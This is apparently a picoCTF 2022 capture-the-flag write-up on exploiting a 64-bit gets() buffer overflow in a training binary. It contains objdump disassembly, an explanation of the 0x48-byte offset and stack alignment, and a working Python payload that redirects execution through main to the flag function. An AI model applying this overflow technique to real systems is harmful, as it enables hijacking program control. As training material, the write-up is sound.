### x-sixty-what

#Medium #Binary_exploitation #picoCTF2022 #x64

Author:Â Sanjay C / LT 'syreal' Jones

Reminder: local exploits may not always work the same way remotely due to differences between machines.

#### Description

Overflow x64 codeMost problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to theÂ `flag`Â function in thisÂ [program](https://artifacts.picoctf.net/c/63/vuln).Â [Download source](https://artifacts.picoctf.net/c/63/vuln.c).`nc saturn.picoctf.net 49445`

##### Solution:

```css
â”Œâ”€[âœ”]â”€â”€[alpha@speed:ğŸ§]â”€â”€[~/Videos]:
â””â”€â”€â•¼ $ objdump -d -M intel ./vuln | grep '<' | egrep ''^0''
0000000000401000 <_init>:
0000000000401020 <.plt>:
00000000004010c0 <puts@plt>:
00000000004010d0 <setresgid@plt>:
00000000004010e0 <printf@plt>:
00000000004010f0 <fgets@plt>:
0000000000401100 <gets@plt>:
0000000000401110 <getegid@plt>:
0000000000401120 <setvbuf@plt>:
0000000000401130 <fopen@plt>:
0000000000401140 <exit@plt>:
0000000000401150 <_start>:
0000000000401180 <_dl_relocate_static_pie>:
0000000000401190 <deregister_tm_clones>:
00000000004011c0 <register_tm_clones>:
0000000000401200 <__do_global_dtors_aux>:
0000000000401230 <frame_dummy>:
0000000000401236 <flag>:
00000000004012b2 <vuln>:
00000000004012d2 <main>:
0000000000401340 <__libc_csu_init>:
00000000004013b0 <__libc_csu_fini>:
00000000004013b8 <_fini>:

â”Œâ”€[âœ”]â”€â”€[alpha@speed:ğŸ§]â”€â”€[~/Videos]:
â””â”€â”€â•¼ $ objdump -d -M intel ./vuln | grep '<' | grep -E '^0'
0000000000401000 <_init>:
0000000000401020 <.plt>:
00000000004010c0 <puts@plt>:
00000000004010d0 <setresgid@plt>:
00000000004010e0 <printf@plt>:
00000000004010f0 <fgets@plt>:
0000000000401100 <gets@plt>:
0000000000401110 <getegid@plt>:
0000000000401120 <setvbuf@plt>:
0000000000401130 <fopen@plt>:
0000000000401140 <exit@plt>:
0000000000401150 <_start>:
0000000000401180 <_dl_relocate_static_pie>:
0000000000401190 <deregister_tm_clones>:
00000000004011c0 <register_tm_clones>:
0000000000401200 <__do_global_dtors_aux>:
0000000000401230 <frame_dummy>:
0000000000401236 <flag>:
00000000004012b2 <vuln>:
00000000004012d2 <main>:
0000000000401340 <__libc_csu_init>:
00000000004013b0 <__libc_csu_fini>:
00000000004013b8 <_fini>:

â”Œâ”€[âœ”]â”€â”€[alpha@speed:ğŸš€]â”€â”€[~/Videos]:
â””â”€â”€â•¼ $ objdump -d  ./vuln | grep '<' | grep -E '^0'
0000000000401000 <_init>:
0000000000401020 <.plt>:
00000000004010c0 <puts@plt>:
00000000004010d0 <setresgid@plt>:
00000000004010e0 <printf@plt>:
00000000004010f0 <fgets@plt>:
0000000000401100 <gets@plt>:
0000000000401110 <getegid@plt>:
0000000000401120 <setvbuf@plt>:
0000000000401130 <fopen@plt>:
0000000000401140 <exit@plt>:
0000000000401150 <_start>:
0000000000401180 <_dl_relocate_static_pie>:
0000000000401190 <deregister_tm_clones>:
00000000004011c0 <register_tm_clones>:
0000000000401200 <__do_global_dtors_aux>:
0000000000401230 <frame_dummy>:
0000000000401236 <flag>:
00000000004012b2 <vuln>:
00000000004012d2 <main>:
0000000000401340 <__libc_csu_init>:
00000000004013b0 <__libc_csu_fini>:
00000000004013b8 <_fini>:


```


```css
â”Œâ”€[âœ˜]â”€â”€[alpha@speed:ğŸ“]â”€â”€[~/Videos]:
â””â”€â”€â•¼ $ objdump -M intel  --disassemble=vuln ./vuln 

./vuln:     file format elf64-x86-64


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .plt.sec:

Disassembly of section .text:

00000000004012b2 <vuln>:
  4012b2:	f3 0f 1e fa          	endbr64 
  4012b6:	55                   	push   rbp
  4012b7:	48 89 e5             	mov    rbp,rsp
  4012ba:	48 83 ec 40          	sub    rsp,0x40
  4012be:	48 8d 45 c0          	lea    rax,[rbp-0x40]
  4012c2:	48 89 c7             	mov    rdi,rax
  4012c5:	b8 00 00 00 00       	mov    eax,0x0
  4012ca:	e8 31 fe ff ff       	call   401100 <gets@plt>
  4012cf:	90                   	nop
  4012d0:	c9                   	leave  
  4012d1:	c3                   	ret    

Disassembly of section .fini:


```

```css
â”Œâ”€[âœ”]â”€â”€[alpha@speed:ğŸš€]â”€â”€[~/Videos]:
â””â”€â”€â•¼ $ objdump -d -M intel ./vuln | awk '/<vuln>:/,/^$/'
00000000004012b2 <vuln>:
  4012b2:	f3 0f 1e fa          	endbr64 
  4012b6:	55                   	push   rbp
  4012b7:	48 89 e5             	mov    rbp,rsp
  4012ba:	48 83 ec 40          	sub    rsp,0x40
  4012be:	48 8d 45 c0          	lea    rax,[rbp-0x40]
  4012c2:	48 89 c7             	mov    rdi,rax
  4012c5:	b8 00 00 00 00       	mov    eax,0x0
  4012ca:	e8 31 fe ff ff       	call   401100 <gets@plt>
  4012cf:	90                   	nop
  4012d0:	c9                   	leave  
  4012d1:	c3                   	ret    


```

how to solve this challenge
# step1

You're on the right track! Let's break it down step by step.

### Understanding the Stack Layout

In your disassembly, the function `vuln()` sets up a stack frame like this:

1. **Function Prologue**
    
    ```assembly
    push   rbp          ; Save the old base pointer
    mov    rbp,rsp      ; Set up new base pointer
    sub    rsp,0x40     ; Allocate 0x40 (64) bytes for local variables
    ```
    
    - The `push rbp` saves the old base pointer (previous function's frame).
    - `mov rbp, rsp` sets up a new base pointer.
    - `sub rsp, 0x40` creates a 64-byte buffer on the stack.
2. **Buffer Start**
    
    ```assembly
    lea    rax,[rbp-0x40]  ; Load address of buffer into rax
    mov    rdi,rax         ; First argument to gets()
    call   gets@plt        ; Call gets()
    ```
    
    - `rbp - 0x40` is the start of the buffer.

### Why `0x40 + 8`?

In 64-bit systems, function calls follow the **System V AMD64 calling convention**, meaning the return address and saved registers are stored in a certain way.

After the buffer (which starts at `rbp - 0x40`), the **saved RBP (8 bytes)** is stored at `rbp`.  
Then, the **return address (8 bytes)** is stored at `rbp + 8`.

Since `gets()` has no bounds checking, you can overflow the buffer and overwrite saved values on the stack.

- **0x40 bytes** â†’ fills the buffer up to `rbp`
- **+8 bytes** â†’ overwrites saved `rbp`
- **+8 more bytes** â†’ overwrites the return address (where control flow is redirected)

So, to **overwrite the return address**, you need **0x40 (buffer) + 8 (saved rbp) = 0x48 bytes** of input.

# step 2

They're explaining a key difference between exploiting buffer overflows in **32-bit** and **64-bit** systems due to **stack alignment requirements**.


### **Understanding Stack Alignment in 64-bit**

In **64-bit** Linux, the stack must be **16-byte aligned** before calling a function. This is enforced by the **System V AMD64 ABI**. If the stack is misaligned, the program may crash or behave unexpectedly.

#### **Why does this matter in an exploit?**

- Normally, in **32-bit** exploitation, you can just overwrite the return address with the target functionâ€™s address (`flag()`).
- But in **64-bit**, directly jumping to `flag()` might break stack alignment, causing a crash.

---

### **The Fix: Return Through `main()` First**

Instead of just overflowing the return address with `flag()`, they are suggesting:

1. **Padding** (fills the buffer + saved `rbp`).
2. **Overwriting the return address with `main()`** (or another function that restores alignment).
3. **Placing `flag()`'s address after that**.

So, execution returns to `main()` first, which properly aligns the stack before calling `flag()`.

---

### **Example Payload Construction**

Instead of:

```
padding + flag_address   # (May cause misalignment)
```

We use:

```
padding + main_address + flag_address   # (Fixes stack alignment)
```

---

### **Why This Works**

- Returning to `main()` first resets the stack correctly.
- Then, execution can safely return to `flag()` without crashing.

This is a common technique when dealing with **buffer overflow exploits in 64-bit binaries**.

step 3

```css
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"B"*8 + b"\xd2\x12\x40" + b"\x00"*5 + b"\x36\x12\x40" + b"\x00"*5)' | ./vuln

```

```css
â”Œâ”€[âœ”]â”€â”€[alpha@speed:ğŸ‘]â”€â”€[~/Videos]:
â””â”€â”€â•¼ $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"B"*8 + b"\xd2\x12\x40" + b"\x00"*5 + b"\x36\x12\x40" + b"\x00"*5)' | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
Welcome to 64-bit. Give me a string that gets you the flag: 
picoctf{}
Segmentation fault (core dumped)
```

online server


```css
```